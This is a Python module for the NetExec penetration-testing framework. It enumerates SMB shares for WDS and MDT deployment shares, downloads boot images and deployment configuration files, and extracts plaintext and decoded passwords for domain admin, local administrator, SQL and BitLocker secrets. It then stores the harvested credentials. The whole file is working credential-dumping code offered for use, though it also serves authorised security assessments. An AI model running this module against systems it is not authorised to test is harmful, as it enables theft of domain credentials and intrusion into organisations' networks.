from base64 import b64decode
from configparser import ConfigParser, Error as ConfigError
from io import BytesIO
from pathlib import Path, PureWindowsPath
from xml.etree import ElementTree as ET

from nxc.helpers.misc import CATEGORY, decode_text
from nxc.helpers.path import sanitize_path_component
from nxc.paths import NXC_PATH


class NXCModule:
    """
    Detect WDS/MDT deployment shares and extract credentials from configuration files.

    Inspect REMINST/REMOTEINSTALL and DeploymentShare$ for Bootstrap.ini,
    CustomSettings.ini, Unattend.xml, and candidate WinPE images.
    Download discovered files, skipping WIM images of 1 GiB or larger by default.
    Report deployment secrets and store complete Windows account credentials.

    Module by @archidote - https://github.com/archidote
    """

    name = "wds_mdt"
    description = r"Detect PXE WDS/MDT SMB shares (REMINST\, DeploymentShare$\) and retrieve credentials from deployment files."
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING
    WIM_MAX_SIZE = 1024 * 1024 * 1024

    # https://learn.microsoft.com/en-us/intune/configmgr/mdt/properties
    ini_accounts = (
        ("UserID", "UserPassword", "UserDomain"),
        ("DomainAdmin", "DomainAdminPassword", "DomainAdminDomain"),
        ("ADDSUserName", "ADDSPassword", "ADDSUserDomain"),
        ("SMSTSRunCommandLineUserName", "SMSTSRunCommandLineUserPassword", ""),
        ("", "AdminPassword", ""),
    )
    ini_settings = (
        "DBID", "DBPwd", "SQLServer", "Instance", "Database", "Password",
        "SafeModeAdminPassword", "TPMOwnerPassword", "BDEPin",
        "OSDBitLockerRecoveryPassword", "OSDBitLockerStartupKey", "JoinDomain", "MachineObjectOU",
    )

    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-unattendedjoin-identification-credentials
    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-useraccounts
    # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-offlineuseraccounts
    xml_accounts = {
        "credentials": "username",
        "autologon": "username",
        "localaccount": "name",
        "administratorpassword": "",
        "offlineadministratorpassword": "",
    }

    def options(self, context, module_options):
        """IGNORE_SIZE_LIMIT     Ignore the 1 GiB WIM download limit (default: False)"""
        self.ignore_size_limit = module_options.get("IGNORE_SIZE_LIMIT", "false").lower() == "true"
        self.output_path = Path(NXC_PATH, "modules", "wds_mdt").resolve()

    def on_login(self, context, connection):
        self.context = context
        self.connection = connection

        for share in connection.conn.listShares():
            share = share["shi1_netname"].rstrip("\x00")
            if share.lower() in {"reminst", "remoteinstall"}:
                self.explore_wds(share)
            elif share.lower() == "deploymentshare$":
                self.explore_mdt(share)

    def save_file(self, share, path, content=None):
        try:
            local_path = self.output_path.joinpath(*(sanitize_path_component(part) for part in (self.connection.host, share, *PureWindowsPath(path.lstrip("\\/")).parts)))
            local_path = local_path.resolve()
            if not local_path.is_relative_to(self.output_path):
                raise ValueError("Output path escapes the module directory")

            local_path.parent.mkdir(parents=True, exist_ok=True)
            with local_path.open("wb") as output:
                if content is None:
                    self.connection.conn.getFile(share, path, output.write)
                else:
                    output.write(content)
            self.context.log.success(f"Saved: {local_path}")
            return True
        except Exception as e:
            self.context.log.fail(f"Failed to save {share}\\{path}: {e}")
            return False

    def explore_wds(self, share):
        self.context.log.success(f"Found share: {share}")
        downloaded = False
        for path in (r"Boot\x64\Images", r"Boot\x86\Images"):
            try:
                entries = self.connection.conn.listPath(share, f"{path}\\*")
            except Exception as e:
                self.context.log.fail(f"Failed to list {share}\\{path}: {e}")
                continue

            for entry in entries:
                if entry.is_directory() or not entry.get_longname().lower().endswith(".wim"):
                    continue
                self.context.log.success(f"Found WIM image: {share}\\{path}\\{entry.get_longname()} ({entry.get_filesize() / (1024 * 1024):.0f} MB)")
                if not self.ignore_size_limit and entry.get_filesize() >= self.WIM_MAX_SIZE:
                    self.context.log.display(f"Skipping {path}\\{entry.get_longname()} (1 GiB WIM download limit; use IGNORE_SIZE_LIMIT=TRUE to download)")
                    continue
                if self.save_file(share, f"{path}\\{entry.get_longname()}"):
                    downloaded = True

        if downloaded:
            self.context.log.display("Manually extract candidate WinPE images with 7zip or wimlib-imagex to look for credentials.")
            self.context.log.display(r"Check Deploy\Scripts\Bootstrap.ini and Deploy\Scripts\CustomSettings.ini.")

    def explore_mdt(self, share):
        self.context.log.success(f"Found share: {share}")
        paths = [r"Control\Bootstrap.ini", r"Control\CustomSettings.ini"]
        try:
            paths.extend(self.connection.spider(share, folder="Control", pattern=["Unattend.xml"]))
        except Exception as e:
            self.context.log.fail(f"Failed to explore {share}\\Control: {e}")

        for path in dict.fromkeys(str(PureWindowsPath(path)) for path in paths):
            content = BytesIO()
            try:
                self.connection.conn.getFile(share, path, content.write)
            except Exception as e:
                self.context.log.fail(f"Failed to read {share}\\{path}: {e}")
                continue
            content = content.getvalue()
            self.save_file(share, path, content)

            try:
                self.report_findings(self.parse_ini(content, f"{share}\\{path}") if path.lower().endswith(".ini") else self.parse_xml(content, f"{share}\\{path}"))
            except (ConfigError, ET.ParseError, ValueError, LookupError) as e:
                self.context.log.fail(f"Failed to parse {share}\\{path}: {e}")

    def report_findings(self, findings):
        for source, fields, credentials in findings:
            self.context.log.success(f"Found deployment settings in {source}")
            for key, value in fields.items():
                self.context.log.highlight(f"  {key}={value if value is not None else '<no value>'}")

            for domain, username, password in credentials:
                if not domain and "\\" in username:
                    domain, username = username.split("\\", 1)
                try:
                    self.context.db.add_credential("plaintext", domain, username, password)
                except Exception as e:
                    self.context.log.fail(f"Failed to store credential from {source}: {e}")

    def parse_ini(self, content, source):
        # https://learn.microsoft.com/en-us/intune/configmgr/mdt/use-the-mdt#values-in-the-customsettingsini-file
        parser = ConfigParser(interpolation=None, delimiters=("=",), strict=False, allow_no_value=True, default_section="")
        parser.read_string(decode_text(content))

        for section in parser.values():
            fields = {}
            credentials = []
            for username, password, domain in self.ini_accounts:
                fields.update({key: section[key] for key in (username, password, domain) if key and key in section})
                if section.get(password) is not None and (not username or section.get(username)):
                    credentials.append((section.get(domain) or "", section[username] if username else "Administrator", section[password]))

            fields.update({key: section[key] for key in self.ini_settings if key in section})
            if fields:
                yield f"{source} [{section.name}]", fields, credentials

    def walk_xml(self, element, source):
        yield source, element
        for index, child in enumerate(element, 1):
            yield from self.walk_xml(child, f"{source}/{child.tag}[{index}]")

    def parse_xml(self, content, source):
        content = ET.fromstring(content)
        for element in content.iter():
            element.tag = element.tag.rsplit("}", 1)[-1].lower()

        for location, element in self.walk_xml(content, f"{source}/{content.tag}"):
            # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-unattendedjoin-identification-machinepassword
            if element.tag == "machinepassword":
                yield location, {"MachinePassword": element.text or ""}, []
            if element.tag not in self.xml_accounts:
                continue
            fields = {child.tag: child.text or "" for child in element if child.tag in {"username", "name", "domain"}}
            credentials = []
            if element.tag == "credentials":
                password = element.findtext("password")
                if password is not None:
                    fields["password"] = password
            else:
                password = element if not self.xml_accounts[element.tag] else element.find("password")
                if password is not None:
                    fields.update({child.tag: child.text or "" for child in password if child.tag in {"value", "plaintext"}})
                    password = self.xml_password(password, location, "Password" if self.xml_accounts[element.tag] else "AdministratorPassword")
                    if password is not None:
                        fields["password"] = password
                        fields.pop("value", None)
                        fields.pop("plaintext", None)

            if password is not None and (not self.xml_accounts[element.tag] or fields.get(self.xml_accounts[element.tag])):
                credentials.append((fields.get("domain", ""), fields[self.xml_accounts[element.tag]] if self.xml_accounts[element.tag] else "Administrator", password))
            if fields:
                yield location, fields, credentials

    def xml_password(self, element, source, suffix):
        # Encoding inferred from Microsoft's examples; PlainText defaults to true.
        # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-autologon-password-plaintext
        # https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-shell-setup-offlineuseraccounts-offlineadministratorpassword
        password = element.findtext("value")
        if password is None or element.findtext("plaintext", "true").strip().lower() not in {"false", "0"}:
            return password

        try:
            password = b64decode("".join(password.split()), validate=True).decode("utf-16-le")
            if not password.endswith(suffix):
                raise ValueError(f"Decoded password is missing the {suffix} suffix")
            return password.removesuffix(suffix)
        except ValueError as e:
            self.context.log.fail(f"Failed to decode password in {source}: {e}")
            return None
